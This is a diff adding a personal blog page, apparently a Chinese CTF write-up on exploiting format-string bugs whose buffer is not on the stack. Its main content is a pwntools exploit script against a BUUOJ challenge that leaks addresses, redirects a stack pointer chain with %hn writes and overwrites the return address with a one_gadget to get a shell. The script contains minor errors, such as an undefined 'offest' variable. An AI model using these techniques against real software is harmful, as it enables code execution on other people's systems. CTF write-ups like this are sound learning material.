@@ -1,0 +1,266 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Fmt_NStack | Masco&#39;s blog</title>
+    <meta name="author" content="Masco" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/background3.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+<script src="https://s4.zstatic.net/ajax/libs/gitalk/1.8.0/gitalk.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/gitalk/1.8.0/gitalk.min.css" />
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  
+
+  <canvas
+    id="fireworks"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
+></canvas>
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+<script src="/js/fireworks.min.js"></script>
+
+    <canvas
+    id="background"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"
+></canvas>
+<script src="/js/background.min.js"></script>
+
+
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>fufufufu~</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>MASCO&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;MASCO&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Fmt_NStack</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/20
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #03a9f4">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/fmt/" style="color: #ffa2c4">
+                    fmt
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <hr>
+<h1 id="格式化字符串-非栈"><a href="#格式化字符串-非栈" class="headerlink" title="格式化字符串(非栈)"></a>格式化字符串(非栈)</h1><span id="more"></span>
+<p>详细学习关于fmt非栈的利用手法推荐b站国资</p>
+<p>关于非栈上格式化字符串的利用在ctf中还是利用比较频繁的 ，可以仔细去学习这一专项。</p>
+<p>tips:<br>（h&#x3D;half）<br>hhn  单字节<br>hn   双字节<br>n    四字节   </p>
+<p>先可以通过例题回忆一下<br>DASCTF<br><a href="dactf_fmtN.png">!图片</a><br>类似这种read的变量非栈上时，并且只有一个main函数时，就可以利用改写ret的地址为onegadget。   </p>
+<pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python">!/usr/<span class="hljs-built_in">bin</span>/python3<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><br><br><span class="hljs-comment">#context.terminal = [&#x27;xterm&#x27;, &#x27;-e&#x27;]</span><br>context.terminal = [<span class="hljs-string">&#x27;xfce4-terminal&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>]<br><span class="hljs-comment">#终端更换</span><br><br>p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>p= remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28406</span>)<br>libc = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">content,payload</span>):<br>    p.sendafter(content,payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">content,payload</span>):<br>    p.sendlineafter(content,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uc64</span>():<br>    u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uc32</span>():<br>    u32(p.recvuntil(<span class="hljs-string">b&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec_fmt</span>(<span class="hljs-params">pad</span>):<span class="hljs-comment">#自动获取到fmt的pad</span><br>    p = process(<span class="hljs-string">&quot;./fmt&quot;</span>)<br>    <span class="hljs-comment"># send 还是 sendline以程序为准</span><br>    p.send(pad)<br>    <span class="hljs-keyword">return</span> p.recv()<br>payload=<span class="hljs-string">b&#x27;%3$p&#x27;</span>+<span class="hljs-string">b&#x27;%6$p&#x27;</span><br>sa(<span class="hljs-string">&quot;keyword&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>got=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;got=&quot;</span>,<span class="hljs-built_in">hex</span>(got))<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0xc8</span>+<span class="hljs-number">0x10</span><br>tar=stack+<span class="hljs-number">0xe0</span>-<span class="hljs-number">0x100</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tar=&quot;</span>,<span class="hljs-built_in">hex</span>(tar))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack=&quot;</span>,<span class="hljs-built_in">hex</span>(stack))<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>one=got+<span class="hljs-number">0xf1247</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;one=&quot;</span>,<span class="hljs-built_in">hex</span>(one))<br><br><br>payload=(<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(tar&amp;<span class="hljs-number">0xffff</span>).encode()+<span class="hljs-string">b&#x27;c%11$hn\x00&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;keyword&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;offest=&quot;</span>,<span class="hljs-built_in">hex</span>(offest))<br>p.send(payload)<br><span class="hljs-comment">#改写当前链为ret的链</span><br><br>payload=(<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((one&amp;<span class="hljs-number">0xffff</span>)).encode()+<span class="hljs-string">b&#x27;c%37$hn\x00&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;keyword&#x27;</span>)<br>p.send(payload)<br>p.recv()<br> <span class="hljs-comment">#改ret第二位为one</span><br><br>payload=(<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((tar&amp;<span class="hljs-number">0xffff</span>)+<span class="hljs-number">2</span>).encode()+<span class="hljs-string">b&#x27;c%11$hn\x00&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;keyword&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;offest=&quot;</span>,<span class="hljs-built_in">hex</span>(offest))<br>p.send(payload)<br><span class="hljs-comment">#ret地址+2</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;offest=&quot;</span>,<span class="hljs-built_in">hex</span>(offest))<br>one=one&gt;&gt;<span class="hljs-number">16</span><br>payload=(<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((one&amp;<span class="hljs-number">0xffff</span>)).encode()+<span class="hljs-string">b&#x27;c%37$hn\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;offest=&quot;</span>,<span class="hljs-built_in">hex</span>(offest))<br>p.recvuntil(<span class="hljs-string">b&#x27;keyword&#x27;</span>)<br>p.send(payload)<br><span class="hljs-comment">#改ret地址+2的第二位地址为one</span><br><br>inter()<br><br></code></pre></td></tr></table></figure>
+</code></pre>
+<p>首先肯定是利用prinf先打印出栈地址和libc地址。<br>再用gdb调试看看栈的调用情况.</p>
+<p><a href="gdb_fmt.png">!图片</a></p>
+<p>可以看到ret链的是__libc_start_main函数，只有这一个所以没办法直接改。<br>不过我们看到后面有一条调用链，有两个一个以上的调用，所以可以将这个后面的调用链改成ret的调用链，即将 0x7fffffffe57c 改为 0x7fffffffe218,这样就会链上ret链。</p>
+<p><a href="fmt_ret.png">!图片</a></p>
+<p>像这样这就链起来辣！<br>链起来之后就只要修改<br><a href="gdb_ret.png">!图片</a><br>将这一部分修改为onegadget就可以了，其中在修改时很大概率不能四字节一起修，但是one与ret的地址又有三字节不相同，所以需要两字节修改两次，或者一字节修改三次。这时需要ret地址+1或2来对剩下的地址再次进行修改。        </p>
+<p>修改完之后就可以getshell了。</p>
+<hr>
+
+    </div>
+    
+    
+    
+    <div id="comment">
+        <div id="gitalk-container"></div>
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2024 - 2024 Masco&#39;s blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Masco
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+<script>
+    const gitalk = new Gitalk({
+        clientID: "",
+        clientSecret: "",
+        repo: "",
+        owner: "",
+        admin: "".split(","),
+        language: "",
+        id: location.pathname,
+        
+    })
+    gitalk.render("gitalk-container");
+</script>
+
+
+
+
+    
+</body>
+</html>
